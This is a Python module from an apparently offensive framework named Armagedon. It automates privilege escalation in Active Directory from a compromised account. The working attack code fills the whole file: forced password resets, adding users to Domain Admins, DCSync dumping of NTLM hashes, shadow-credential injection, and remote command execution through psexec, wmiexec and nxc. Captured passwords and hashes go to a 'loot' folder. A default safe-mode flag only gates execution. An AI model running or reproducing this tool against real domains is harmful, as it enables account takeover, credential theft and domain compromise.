"""
Armagedon Domain Attack Executor

Takes DomainIntel's outbound object control analysis and executes targeted
attacks against AD objects: password resets, group membership changes,
DCSync, RBCD, shadow credentials, admin access, and more.

Workflow:
  1. Ingest domain data (ldapdomaindump / BloodHound JSON / live LDAP)
  2. Identify outbound object control for compromised user
  3. Rank targets by escalation value
  4. Execute the highest-value attack

Modes:
    CHECK   -- ingest data and show what attacks are available
    EXPLOIT -- execute the recommended attack(s)

Safety:
    SAFE_MODE=1 (default) blocks destructive operations.
    Set SAFE_MODE=0 to allow execution.
"""

import os
import re
import json
import shutil
import logging
import subprocess
from pathlib import Path
from typing import Any, Dict, List, Optional

log = logging.getLogger("armagedon.modules.auxiliary.domain_attack")

CVE = "N/A"
DESCRIPTION = "Domain Attack Executor -- targeted AD attacks via outbound object control"
PLATFORM = "Windows"
RANK = "normal"
AUTHOR = "Armagedon"
DISCLOSURE = "N/A"

SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
SAFETY_LEVEL = "HIGH"

OPTIONS = {
    "RHOSTS": "",
    "USERNAME": "",
    "PASSWORD": "",
    "DOMAIN": "",
    "INGEST_DIR": "",
    "INGEST_BH_DIR": "",
    "DC_IP": "",
    "TARGET_USER": "",
    "NEW_PASSWORD": "",
    "GROUP_NAME": "Domain Admins",
    "MODE": "CHECK",
    "MAX_ATTACKS": 5,
    "OUTPUT_DIR": "",
    "VERBOSE": False,
}

REQUIRED = {"RHOSTS": False, "USERNAME": False}
DESCRIPTIONS = {
    "RHOSTS": "Domain Controller IP (for live LDAP + rpcclient)",
    "USERNAME": "Compromised user name",
    "PASSWORD": "Compromised user password",
    "DOMAIN": "AD domain (e.g., COOCTUS.CORP)",
    "INGEST_DIR": "ldapdomaindump output directory",
    "INGEST_BH_DIR": "BloodHound JSON directory",
    "DC_IP": "DC IP for attack commands (falls back to RHOSTS)",
    "TARGET_USER": "Specific target user to attack (empty = auto-select best)",
    "NEW_PASSWORD": "New password for password reset attacks (auto-gen if empty)",
    "GROUP_NAME": "Target group for AddMember attacks (default: Domain Admins)",
    "MODE": "CHECK | EXPLOIT",
    "MAX_ATTACKS": "Max number of attacks to execute (default 5)",
    "OUTPUT_DIR": "Output directory for results",
    "VERBOSE": "Show detailed output",
}


def _find_tool(name):
    return shutil.which(name)


def _run_cmd(cmd, timeout=30, stdin_data=None):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", 1
    except FileNotFoundError:
        return "", f"Tool not found: {cmd[0]}", 1
    except Exception as e:
        return "", str(e), 1


def _run_shell(cmd_str, timeout=30):
    try:
        r = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", 1
    except Exception as e:
        return "", str(e), 1


def _gen_password(length=16):
    import string
    import random
    chars = string.ascii_letters + string.digits + "!@#$%&*"
    while True:
        pw = "".join(random.choices(chars, k=length))
        if (any(c.islower() for c in pw) and any(c.isupper() for c in pw)
                and any(c.isdigit() for c in pw) and any(c in "!@#$%&*" for c in pw)):
            return pw


# ── Attack Implementations ────────────────────────────────────────────────────

def _attack_force_change_password(dc_ip, domain, user, password,
                                  target_name, target_rid, new_password):
    log.info("ForceChangePassword: %s -> %s", user, target_name)
    if not dc_ip or not domain or not user or not password:
        return {"success": False, "error": "Missing dc_ip/domain/user/password"}
    if not target_rid:
        return {"success": False, "error": f"No RID available for {target_name}"}
    if not new_password:
        new_password = _gen_password()

    rpcclient = _find_tool("rpcclient")
    if rpcclient:
        cmd = [rpcclient, f"//{dc_ip}", "-U", f"{domain}\\{user}%{password}"]
        stdin_data = f"setuserinfo2 {target_rid} 23 {new_password}\nquit\n"
        stdout, stderr, rc = _run_cmd(cmd, timeout=15, stdin_data=stdin_data)
        combined = stdout + stderr
        if rc == 0 and "NT_STATUS_ACCESS_DENIED" not in combined:
            return {"success": True, "method": "rpcclient setuserinfo2",
                    "target": target_name, "new_password": new_password,
                    "output": stdout.strip()[:1000]}
        log.debug("rpcclient setuserinfo2 failed: %s", combined[:200])

    net_cmd = f"net rpc user setpass '{target_name}' '{new_password}' -U '{domain}\\{user}%{password}' -S {dc_ip}"
    stdout, stderr, rc = _run_shell(net_cmd, timeout=15)
    combined = stdout + stderr
    if rc == 0 and "error" not in combined.lower() and "denied" not in combined.lower():
        return {"success": True, "method": "net rpc user setpass",
                "target": target_name, "new_password": new_password,
                "output": combined.strip()[:1000]}

    return {"success": False, "error": f"Password reset failed: {combined[:300]}"}


def _attack_add_member(dc_ip, domain, user, password, group_name, target_name):
    log.info("AddMember: %s -> %s", target_name, group_name)
    if not dc_ip or not domain or not user or not password:
        return {"success": False, "error": "Missing dc_ip/domain/user/password"}

    net_cmd = f"net rpc group addmem '{group_name}' '{target_name}' -U '{domain}\\{user}%{password}' -S {dc_ip}"
    stdout, stderr, rc = _run_shell(net_cmd, timeout=15)
    combined = stdout + stderr
    if rc == 0 and "denied" not in combined.lower() and "error" not in combined.lower():
        return {"success": True, "method": "net rpc group addmem",
                "group": group_name, "target": target_name,
                "output": combined.strip()[:1000]}

    rpcclient = _find_tool("rpcclient")
    if rpcclient:
        cmd = [rpcclient, f"//{dc_ip}", "-U", f"{domain}\\{user}%{password}"]
        stdin_data = f"addmem {group_name} {target_name}\nquit\n"
        stdout2, stderr2, rc2 = _run_cmd(cmd, timeout=15, stdin_data=stdin_data)
        if rc2 == 0 and "denied" not in (stdout2 + stderr2).lower():
            return {"success": True, "method": "rpcclient addmem",
                    "group": group_name, "target": target_name,
                    "output": stdout2.strip()[:1000]}

    return {"success": False, "error": f"AddMember failed: {combined[:300]}"}


def _attack_dcsync(dc_ip, domain, user, password, target_user="Administrator"):
    log.info("DCSync: dumping %s hashes", target_user)
    cmd_str = f"impacket-secretsdump '{domain}/{user}:{password}@{dc_ip}' -just-dc-user {target_user}"
    stdout, stderr, rc = _run_shell(cmd_str, timeout=60)
    combined = stdout + stderr

    ntlm_match = re.search(r'(?i)([0-9a-f]{32}:[0-9a-f]{32})', combined)
    if ntlm_match:
        return {"success": True, "method": "secretsdump DCSync",
                "target": target_user, "ntlm_hash": ntlm_match.group(1),
                "output": combined[:2000]}

    if "ACCESS_DENIED" in combined.upper() or "rpc_s_access_denied" in combined.lower():
        return {"success": False,
                "error": f"DCSync denied -- user {user} lacks replication rights",
                "output": combined[:500]}
    return {"success": False, "error": f"DCSync failed: {combined[:500]}"}


def _attack_shadow_credentials(dc_ip, domain, user, password, target_name):
    log.info("Shadow Credentials: %s", target_name)
    pywhisker = _find_tool("pywhisker")
    if pywhisker:
        cmd_str = f"{pywhisker} -d {domain} -u {user} -p {password} --target {target_name} --action add --dc-ip {dc_ip}"
        stdout, stderr, rc = _run_shell(cmd_str, timeout=30)
        combined = stdout + stderr
        if rc == 0 and ("SUCCESS" in combined.upper() or "added" in combined.lower()):
            return {"success": True, "method": "pywhisker",
                    "target": target_name, "output": combined[:2000]}

    return {"success": False, "method": "shadow_credentials",
            "error": "pywhisker not found or failed",
            "manual_command": f"pywhisker -d {domain} -u {user} -p {password} --target {target_name} --action add --dc-ip {dc_ip}",
            "fallback": f"Whisker.exe add /target:{target_name} /domain:{domain} /username:{user} /password:{password} /dc:{dc_ip}"}


def _attack_admin_access(dc_ip, domain, user, password, target_host):
    log.info("Admin access: %s", target_host)
    nxc = _find_tool("nxc")
    if nxc:
        cmd = [nxc, "smb", target_host, "-u", user, "-p", password, "-d", domain, "-x", "whoami"]
        stdout, stderr, rc = _run_cmd(cmd, timeout=15)
        combined = stdout + stderr
        if rc == 0 and "nt authority" in combined.lower():
            return {"success": True, "method": "nxc smb -x",
                    "target": target_host, "output": combined.strip()[:500]}

    psexec = _find_tool("impacket-psexec")
    if psexec:
        cmd_str = f"{psexec} '{domain}/{user}:{password}@{target_host}' whoami"
        stdout, stderr, rc = _run_shell(cmd_str, timeout=20)
        if rc == 0 and ("nt authority" in stdout.lower() or "system" in stdout.lower()):
            return {"success": True, "method": "psexec",
                    "target": target_host, "output": stdout.strip()[:500]}

    wmiexec = _find_tool("impacket-wmiexec")
    if wmiexec:
        cmd_str = f"{wmiexec} '{domain}/{user}:{password}@{target_host}' whoami"
        stdout, stderr, rc = _run_shell(cmd_str, timeout=20)
        if rc == 0 and ("nt authority" in stdout.lower() or "system" in stdout.lower()):
            return {"success": True, "method": "wmiexec",
                    "target": target_host, "output": stdout.strip()[:500]}

    return {"success": False, "error": f"Admin access failed for {target_host}"}


# ── Attack Dispatcher ─────────────────────────────────────────────────────────

ATTACK_DISPATCH = {
    "ForceChangePassword": lambda intel, ctrl, opts: _attack_force_change_password(
        opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
        ctrl.target_name, ctrl.target_sid.split("-")[-1] if ctrl.target_sid else "",
        opts.get("NEW_PASSWORD", ""),
    ),
    "GenericAll": lambda intel, ctrl, opts: (
        _attack_force_change_password(
            opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
            ctrl.target_name, ctrl.target_sid.split("-")[-1] if ctrl.target_sid else "",
            opts.get("NEW_PASSWORD", ""),
        ) if ctrl.target_type == "user" else
        _attack_add_member(
            opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
            opts.get("GROUP_NAME", "Domain Admins"), ctrl.target_name,
        ) if ctrl.target_type == "group" else
        _attack_admin_access(
            opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
            ctrl.target_name,
        )
    ),
    "AddMember": lambda intel, ctrl, opts: _attack_add_member(
        opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
        opts.get("GROUP_NAME", "Domain Admins"), ctrl.target_name,
    ),
    "AddKeyCredentialLink": lambda intel, ctrl, opts: _attack_shadow_credentials(
        opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
        ctrl.target_name,
    ),
    "AdminTo": lambda intel, ctrl, opts: _attack_admin_access(
        opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
        ctrl.target_name,
    ),
    "WriteDACL": lambda intel, ctrl, opts: {
        "success": False, "method": "write_dacl",
        "error": "Requires target DN for dacledit.py",
        "chain": "Grant FullControl then use setuserinfo2 for password reset",
    },
    "WriteOwner": lambda intel, ctrl, opts: {
        "success": False, "method": "write_owner",
        "error": "Requires target DN for owneredit.py",
        "chain": "Change owner then grant Self FullControl",
    },
    "AllExtendedRights": lambda intel, ctrl, opts: (
        _attack_force_change_password(
            opts["DC_IP"], opts["DOMAIN"], opts["USERNAME"], opts["PASSWORD"],
            ctrl.target_name, ctrl.target_sid.split("-")[-1] if ctrl.target_sid else "",
            opts.get("NEW_PASSWORD", ""),
        ) if ctrl.target_type == "user" else
        {"success": False, "error": "AllExtendedRights on non-user object -- manual intervention needed"}
    ),
    "HasSession": lambda intel, ctrl, opts: {
        "success": False, "method": "session_hijack",
        "error": f"Session hijack on {ctrl.target_name} -- requires access to host",
    },
    "CanRDP": lambda intel, ctrl, opts: {
        "success": False, "method": "rdp_access",
        "error": f"RDP to {ctrl.target_name} -- requires xfreerdp + GUI session",
    },
    "CanPSRemote": lambda intel, ctrl, opts: {
        "success": False, "method": "ps_remote",
        "error": f"PSRemoting to {ctrl.target_name} -- requires PowerShell remoting setup",
    },
    "ExecuteDCOM": lambda intel, ctrl, opts: {
        "success": False, "method": "dcom_exec",
        "error": f"DCOM exec on {ctrl.target_name} -- requires dcomexec.py + specific DCOM object",
    },
}


def _safety_gate():
    """Check if we're allowed to execute attacks."""
    if SAFE_MODE:
        return False, "SAFE_MODE=1 -- attacks blocked. Set ARMAGEDON_SAFE_MODE=0 to allow."
    return True, "Safe mode off"


def _get_intel(opts):
    """Create and populate a DomainIntel instance from options."""
    from armagedon.core.domain_intel import DomainIntel
    intel = DomainIntel()

    ingest_dir = opts.get("INGEST_DIR", "")
    ingest_bh_dir = opts.get("INGEST_BH_DIR", "")
    dc_ip = opts.get("DC_IP") or opts.get("RHOSTS", "")
    domain = opts.get("DOMAIN", "")
    user = opts.get("USERNAME", "")
    password = opts.get("PASSWORD", "")

    if ingest_dir and Path(ingest_dir).is_dir():
        log.info("Ingesting ldapdomaindump from %s", ingest_dir)
        intel.ingest_ldapdomaindump(ingest_dir)
    elif ingest_bh_dir and Path(ingest_bh_dir).is_dir():
        log.info("Ingesting BloodHound JSON from %s", ingest_bh_dir)
        intel.ingest_bloodhound_json(ingest_bh_dir)
    elif dc_ip and domain and user:
        log.info("Live LDAP enumeration against %s", dc_ip)
        intel.ingest_live(dc_ip, domain, user, password)
    else:
        log.warning("No ingest source specified or available")

    return intel


# ── Module Interface ──────────────────────────────────────────────────────────

def check(options=None, target=None, **kwargs):
    """Verify prerequisites: at least one ingest source or credentials."""
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    ingest_dir = opts.get("INGEST_DIR", "")
    ingest_bh_dir = opts.get("INGEST_BH_DIR", "")
    dc_ip = opts.get("DC_IP") or opts.get("RHOSTS", "")
    user = opts.get("USERNAME", "")
    domain = opts.get("DOMAIN", "")

    if ingest_dir and Path(ingest_dir).is_dir():
        return True, f"Ingest source: ldapdomaindump ({ingest_dir})"
    if ingest_bh_dir and Path(ingest_bh_dir).is_dir():
        return True, f"Ingest source: BloodHound JSON ({ingest_bh_dir})"
    if dc_ip and user and domain:
        return True, f"Live LDAP against {dc_ip} ({domain}\\{user})"
    return False, "Need INGEST_DIR, INGEST_BH_DIR, or DC_IP+USERNAME+DOMAIN"


def run(options=None, target=None, mode="CHECK", **kwargs):
    """Execute domain attack workflow.

    Modes:
        CHECK   -- ingest data and show available attacks
        EXPLOIT -- execute the highest-value attack(s)
    """
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target
    if mode:
        opts["MODE"] = mode.upper()

    dc_ip = opts.get("DC_IP") or opts.get("RHOSTS", "")
    user = opts.get("USERNAME", "")
    password = opts.get("PASSWORD", "")
    domain = opts.get("DOMAIN", "")
    target_user = opts.get("TARGET_USER", "")
    max_attacks = int(opts.get("MAX_ATTACKS", 5))
    verbose = opts.get("VERBOSE", False)

    print(f"\n{'='*70}")
    print(f"  Armagedon -- Domain Attack Executor")
    print(f"  User: {domain}\\{user}")
    print(f"  DC:   {dc_ip}")
    print(f"  Mode: {opts.get('MODE', mode.upper())}")
    print(f"{'='*70}")

    # 1. Ingest
    print("\n[*] Ingesting domain data...")
    intel = _get_intel(opts)
    summary = intel.summary()
    print(f"    Objects: {summary.get('total_objects', 0)} "
          f"(users={summary.get('object_types', {}).get('user', 0)}, "
          f"groups={summary.get('object_types', {}).get('group', 0)}, "
          f"computers={summary.get('object_types', {}).get('computer', 0)})")
    print(f"    ACL entries: {summary.get('acl_entries', 0)}")
    print(f"    Outbound controls: {summary.get('outbound_controls', 0)}")

    if summary.get("total_objects", 0) == 0:
        print("\n[!] No domain data ingested -- cannot proceed")
        return {"success": False, "error": "No domain data available"}

    # 2. Show outbound control for compromised user
    if user:
        intel.print_whoami(user)
        intel.print_outbound_control(user)

    # 3. Find attack targets
    if target_user:
        controls = intel.get_outbound_control(user)
        controls = [c for c in controls if c.target_name.lower() == target_user.lower()]
        if not controls:
            print(f"[!] No control found from {user} to {target_user}")
    else:
        controls = intel.rank_escalation_targets(user)

    if not controls:
        print("[!] No outbound object control found -- nothing to attack")
        return {"success": True, "message": "No attacks available",
                "summary": summary, "controls": []}

    print(f"\n[*] Available attacks ({len(controls)}):")
    for i, c in enumerate(controls[:max_attacks * 2], 1):
        hv = " [HIGH VALUE]" if (intel.objects.get(c.target_sid) and
                                 intel.objects[c.target_sid].is_high_value) else ""
        auto = " [AUTO]" if c.right_name in ATTACK_DISPATCH else ""
        print(f"    {i}. {c.target_name}{hv} -- {c.right_name}{auto} (severity={c.attack_info.get('severity', '?')})")

    # CHECK mode: just show the attacks
    if opts.get("MODE", mode.upper()) == "CHECK":
        print(f"\n[*] CHECK mode -- showing recommended attacks (not executing)")
        recommendation = intel.recommend_attack(user, target_user)
        print(f"\n    Best attack: {recommendation.get('right', 'N/A')} on {recommendation.get('target', 'N/A')}")
        if "example_commands" in recommendation:
            print("    Example commands:")
            for cmd in recommendation["example_commands"]:
                print(f"      {cmd}")

        return {
            "success": True,
            "message": "CHECK complete",
            "summary": summary,
            "controls_found": len(controls),
            "top_controls": [
                {"target": c.target_name, "right": c.right_name,
                 "severity": c.attack_info.get("severity", "?"),
                 "attack": c.attack_info.get("attack", "?"),
                 "chain_value": c.chain_value}
                for c in controls[:max_attacks]
            ],
            "recommendation": recommendation,
        }

    # EXPLOIT mode: execute attacks
    allowed, msg = _safety_gate()
    if not allowed:
        print(f"\n[!] {msg}")
        return {"success": False, "error": msg, "summary": summary}

    print(f"\n[*] EXPLOIT mode -- executing up to {max_attacks} attack(s)")
    results = []

    for i, ctrl in enumerate(controls[:max_attacks]):
        if ctrl.right_name not in ATTACK_DISPATCH:
            print(f"\n    [{i+1}] {ctrl.right_name} on {ctrl.target_name} -- no auto-attack, skipping")
            results.append({"control": ctrl.right_name, "target": ctrl.target_name,
                           "status": "skipped", "reason": "no auto-attack dispatcher"})
            continue

        print(f"\n    [{i+1}/{max_attacks}] {ctrl.right_name} -> {ctrl.target_name}")
        print(f"        Attack: {ctrl.attack_info.get('attack', '?')}")

        dispatcher = ATTACK_DISPATCH[ctrl.right_name]
        try:
            result = dispatcher(intel, ctrl, opts)
        except Exception as e:
            log.error("Attack failed: %s", e)
            result = {"success": False, "error": str(e)}

        success = result.get("success", False)
        status = "SUCCESS" if success else "FAILED"
        print(f"        Result: {status}")
        if success:
            print(f"        Method: {result.get('method', '?')}")
            if result.get("new_password"):
                print(f"        New Password: {result['new_password']}")
            if result.get("ntlm_hash"):
                print(f"        NTLM Hash: {result['ntlm_hash']}")
        else:
            print(f"        Error: {result.get('error', 'unknown')[:200]}")

        results.append({
            "control": ctrl.right_name,
            "target": ctrl.target_name,
            "target_type": ctrl.target_type,
            "severity": ctrl.attack_info.get("severity", "?"),
            "status": status,
            "result": result,
        })

        # If password reset succeeded and we targeted a DA/EA, we might be done
        if success and ctrl.right_name in ("ForceChangePassword", "GenericAll"):
            target_obj = intel.objects.get(ctrl.target_sid)
            if target_obj and target_obj.is_high_value:
                print(f"\n    [+] HIGH VALUE TARGET COMPROMISED: {ctrl.target_name}")
                if ctrl.target_type == "group" and ctrl.right_name == "AddMember":
                    print(f"    [+] {user} should now be a member of {ctrl.target_name}")

    # Summary
    succeeded = [r for r in results if r["status"] == "SUCCESS"]
    failed = [r for r in results if r["status"] == "FAILED"]
    skipped = [r for r in results if r["status"] == "skipped"]

    print(f"\n{'='*70}")
    print(f"  DOMAIN ATTACK RESULTS")
    print(f"{'='*70}")
    print(f"  Total:     {len(results)}")
    print(f"  Succeeded: {len(succeeded)}")
    print(f"  Failed:    {len(failed)}")
    print(f"  Skipped:   {len(skipped)}")
    print(f"{'='*70}\n")

    # Export
    output_dir = opts.get("OUTPUT_DIR", "")
    if not output_dir:
        output_dir = os.path.join(os.path.expanduser("~"), "armagedon_loot")
    os.makedirs(output_dir, exist_ok=True)
    export_file = os.path.join(output_dir, "domain_attack_results.json")
    try:
        Path(export_file).write_text(json.dumps({
            "user": user, "dc_ip": dc_ip, "domain": domain,
            "summary": summary, "results": results,
        }, indent=2, default=str))
        print(f"[+] Results exported: {export_file}")
    except Exception as e:
        print(f"[!] Export error: {e}")

    return {
        "success": len(succeeded) > 0,
        "summary": summary,
        "results": results,
        "succeeded": len(succeeded),
        "failed": len(failed),
        "export_file": export_file,
    }
